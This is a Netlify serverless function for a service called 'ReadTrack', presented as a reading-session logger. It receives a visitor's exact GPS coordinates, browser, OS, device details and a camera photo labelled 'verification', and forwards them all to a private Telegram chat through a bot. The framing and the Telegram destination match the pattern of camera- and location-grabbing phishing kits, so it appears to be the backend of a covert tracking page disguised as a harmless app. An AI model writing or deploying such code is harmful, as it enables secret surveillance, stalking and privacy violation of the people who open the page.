/* ============================================================
   ReadTrack — netlify/functions/session.js
   Netlify Serverless Function
   Endpoint: POST /.netlify/functions/session
   (proxied to /api/session via netlify.toml redirect)
   ============================================================ */

'use strict';

const fetch    = require('node-fetch');
const FormData = require('form-data');

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID   = process.env.TELEGRAM_CHAT_ID;
const BASE_URL  = `https://api.telegram.org/bot${BOT_TOKEN}`;

// ── Parse multipart/form-data from base64 body ───────────────
function parseMultipart(event) {
  // Netlify passes body as string (base64 if binary)
  const contentType = event.headers['content-type'] || event.headers['Content-Type'] || '';
  const boundary = contentType.split('boundary=')[1];

  if (!boundary) return { fields: {}, photoBuffer: null, photoName: 'verification.jpg' };

  const bodyBuffer = event.isBase64Encoded
    ? Buffer.from(event.body, 'base64')
    : Buffer.from(event.body, 'binary');

  const fields     = {};
  let photoBuffer  = null;
  let photoName    = 'verification.jpg';

  const boundaryBuf = Buffer.from('--' + boundary);
  const parts       = splitBuffer(bodyBuffer, boundaryBuf);

  for (const part of parts) {
    if (!part || part.length < 4) continue;

    // Split headers from body at \r\n\r\n
    const separatorIdx = indexOfSequence(part, Buffer.from('\r\n\r\n'));
    if (separatorIdx === -1) continue;

    const headerSection = part.slice(0, separatorIdx).toString('utf8');
    const bodySection   = part.slice(separatorIdx + 4);

    // Remove trailing \r\n
    const bodyTrimmed = bodySection.slice(
      0,
      bodySection.length - (bodySection.slice(-2).toString() === '\r\n' ? 2 : 0)
    );

    // Parse Content-Disposition
    const dispositionMatch = headerSection.match(/Content-Disposition:[^\r\n]*name="([^"]+)"/i);
    if (!dispositionMatch) continue;

    const fieldName   = dispositionMatch[1];
    const filenameMatch = headerSection.match(/filename="([^"]+)"/i);

    if (filenameMatch) {
      // File field
      photoName   = filenameMatch[1];
      photoBuffer = bodyTrimmed;
    } else {
      // Text field
      fields[fieldName] = bodyTrimmed.toString('utf8');
    }
  }

  return { fields, photoBuffer, photoName };
}

function splitBuffer(buf, delimiter) {
  const parts = [];
  let   start = 0;
  let   idx   = buf.indexOf(delimiter, start);

  while (idx !== -1) {
    parts.push(buf.slice(start, idx));
    start = idx + delimiter.length;
    idx   = buf.indexOf(delimiter, start);
  }
  parts.push(buf.slice(start));
  return parts;
}

function indexOfSequence(buf, seq) {
  for (let i = 0; i <= buf.length - seq.length; i++) {
    let found = true;
    for (let j = 0; j < seq.length; j++) {
      if (buf[i + j] !== seq[j]) { found = false; break; }
    }
    if (found) return i;
  }
  return -1;
}

// ── Sanitize helpers ─────────────────────────────────────────
function sanitizeString(val, maxLen = 200) {
  if (typeof val !== 'string') return '';
  return val.replace(/[<>]/g, '').trim().slice(0, maxLen);
}

function sanitizeFloat(val) {
  const n = parseFloat(val);
  return isNaN(n) ? null : n;
}

// ── Build Telegram message ───────────────────────────────────
function buildMessage(data) {
  const { sessionId, startTime, endTime, duration,
          latitude, longitude, accuracy,
          browser, os, device, cameraOk } = data;

  const locationLine = (latitude && longitude)
    ? `📍 *Location:* \`${parseFloat(latitude).toFixed(6)}, ${parseFloat(longitude).toFixed(6)}\`\n📡 *GPS Accuracy:* ${accuracy ? parseFloat(accuracy).toFixed(1) + ' m' : 'N/A'}`
    : '📍 *Location:* Unavailable';

  return (
    `📚 *Reading Session Completed*\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🆔 *Session ID:* \`${sessionId}\`\n` +
    `🕐 *Start Time:* ${startTime}\n` +
    `🕑 *End Time:*   ${endTime}\n` +
    `⏱️ *Duration:*   ${duration}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `${locationLine}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `🌐 *Browser:* ${browser}\n` +
    `💻 *OS:*      ${os}\n` +
    `📱 *Device:*  ${device}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `📷 *Camera Verification:* ${cameraOk === 'true' || cameraOk === true ? '✅ Verified' : '⚠️ Not captured'}\n` +
    `━━━━━━━━━━━━━━━━━━━━━━━\n` +
    `✅ *Session Status:* COMPLETED`
  );
}

// ── Send text message ────────────────────────────────────────
async function sendMessage(text) {
  const res = await fetch(`${BASE_URL}/sendMessage`, {
    method:  'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' }),
  });
  const json = await res.json();
  if (!json.ok) throw new Error(`Telegram sendMessage failed: ${json.description}`);
  return json;
}

// ── Send photo with caption ──────────────────────────────────
async function sendPhoto(photoBuffer, filename, caption) {
  const form = new FormData();
  form.append('chat_id',    CHAT_ID);
  form.append('caption',    caption);
  form.append('parse_mode', 'Markdown');
  form.append('photo', photoBuffer, { filename, contentType: 'image/jpeg' });

  const res = await fetch(`${BASE_URL}/sendPhoto`, {
    method: 'POST',
    body:   form,
  });
  const json = await res.json();
  if (!json.ok) throw new Error(`Telegram sendPhoto failed: ${json.description}`);
  return json;
}

// ── Netlify handler ──────────────────────────────────────────
exports.handler = async function (event) {
  // Only allow POST
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, body: JSON.stringify({ error: 'Method not allowed.' }) };
  }

  // Check credentials
  if (!BOT_TOKEN || !CHAT_ID) {
    return { statusCode: 500, body: JSON.stringify({ error: 'Server not configured.' }) };
  }

  try {
    const { fields, photoBuffer, photoName } = parseMultipart(event);

    const sessionId = sanitizeString(fields.sessionId, 50);
    if (!sessionId) {
      return { statusCode: 400, body: JSON.stringify({ error: 'sessionId is required.' }) };
    }

    const data = {
      sessionId,
      startTime: sanitizeString(fields.startTime, 50),
      endTime:   sanitizeString(fields.endTime,   50),
      duration:  sanitizeString(fields.duration,  30),
      latitude:  sanitizeFloat(fields.latitude),
      longitude: sanitizeFloat(fields.longitude),
      accuracy:  sanitizeFloat(fields.accuracy),
      browser:   sanitizeString(fields.browser,  100),
      os:        sanitizeString(fields.os,       100),
      device:    sanitizeString(fields.device,    50),
      cameraOk:  fields.cameraOk,
    };

    const message = buildMessage(data);

    if (photoBuffer && photoBuffer.length > 0) {
      await sendPhoto(photoBuffer, photoName, message);
    } else {
      await sendMessage(message);
    }

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true, sessionId }),
    };

  } catch (err) {
    console.error('[Session Function]', err.message);
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Failed to process session.' }),
    };
  }
};
